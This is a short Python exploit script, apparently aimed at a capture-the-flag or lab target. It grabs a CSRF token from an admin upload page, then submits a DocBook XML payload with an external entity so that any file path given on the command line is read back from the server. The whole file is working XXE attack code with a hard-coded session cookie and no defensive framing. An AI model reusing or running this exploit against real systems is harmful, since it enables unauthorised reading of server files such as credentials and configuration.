import requests
import re
from bs4 import BeautifulSoup
from sys import argv

#jsessionid = "10CC87DB23CA87C27ECE29081BB91F10"

proxies = {
  "http":  "http://127.0.0.1:18080",
  "https": "http://127.0.0.1:18080",
}

session = requests.Session()
cookies = {"JSESSIONID":"98A562FBB7CF0F2C563159CF87057A1C"}

def get_csrf_token():

    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
    
    response = session.get("http://hfxxe.xss.lol:8024/admin/upload", headers=headers, cookies=cookies)

    for line in response.content.splitlines():
        #print line
        if "_csrf" in line:
            token = re.search('value="(.*)"', line, re.IGNORECASE)
            if token:
                #print("CSRF Token:"+token.group(1))
                return token.group(1)
    return None

def send_payload(xmlCode,csrfToken):

    paramsPost = {"template":"doc_book_preview.xsl","action":"test","_csrf":csrfToken,"xmlCode":xmlCode,"title":"New Book"}
    headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0","Referer":"http://localhost:8001/admin/upload","Connection":"close","Accept-Language":"en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}
    response = session.post("http://hfxxe.xss.lol:8024/admin/upload", data=paramsPost, headers=headers, cookies=cookies) #, proxies=proxies)

    #print("Status code:   %i" % response.status_code)
    return response.content

def parse_result(responseBody):
    pass


def send_payload_file(file):
    xml1 = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [<!ENTITY xxe SYSTEM '"""+file+"""' > ]>
<book xml:id="simple_book" xmlns="http://docbook.org/ns/docbook" version="5.0">
    <title>Very simple book</title>
    <chapter xml:id="chapter_1">
        <title>&xxe;</title>
        <para></para>
    </chapter>
</book>"""
    response = send_payload(xml1, token)
    soup = BeautifulSoup(response, "html.parser")
    results = soup.find_all("h6")
    if(len(results) > 0):
        return results[0].text
    else:
        return response

token = get_csrf_token()
#print token


if(len(argv) > 1):
    print(send_payload_file(argv[1]))